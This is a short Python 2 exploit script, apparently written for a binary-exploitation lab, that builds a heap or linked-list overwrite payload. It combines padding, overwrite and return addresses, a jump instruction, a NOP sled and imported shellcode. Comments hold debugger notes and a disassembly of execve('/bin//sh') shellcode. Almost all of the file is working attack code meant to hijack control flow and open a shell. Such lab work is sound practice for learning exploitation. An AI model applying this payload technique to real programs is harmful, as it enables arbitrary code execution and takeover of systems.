from shellcode import shellcode
print shellcode
print 'B'*40  + '\x80\x37\x0f\x08'+ '\x5c\xde\xfe\xbf'
print '\xeb\x17\x8b\x45'+ '\x90'*100 + shellcode
#jmp instruction
#'0x458b1774
# more than 40 overwrites prev, 44, after for B
# B will overwrite prev, after of C
# 0x80f3718: has a addresses, 0x80f3748:b
#0xbffeffcc is ret address for list delete after c
#0x08048f51 breakpoint at the critical delete comand
#0x80f3780: should have shell addr for ret if i use c
#b *0x08048f3a
#disas 0xbffff489,+40
#got everything need to modify shellcode
#jmp eb080000
 # 0xbffefcc4:	push   $0xb
 #   0xbffefcc6:	pop    %eax
 #   0xbffefcc7:	cltd   
 #   0xbffefcc8:	push   %edx
 #   0xbffefcc9:	push   $0x68732f2f
 #   0xbffefcce:	push   $0x6e69622f
 #   0xbffefcd3:	mov    %esp,%ebx
 #   0xbffefcd5:	push   %edx
 #   0xbffefcd6:	push   %ebx
 #   0xbffefcd7:	mov    %esp,%ecx
 #   0xbffefcd9:	int    $0x80

#VM
# ret address is now 0xbffede5c: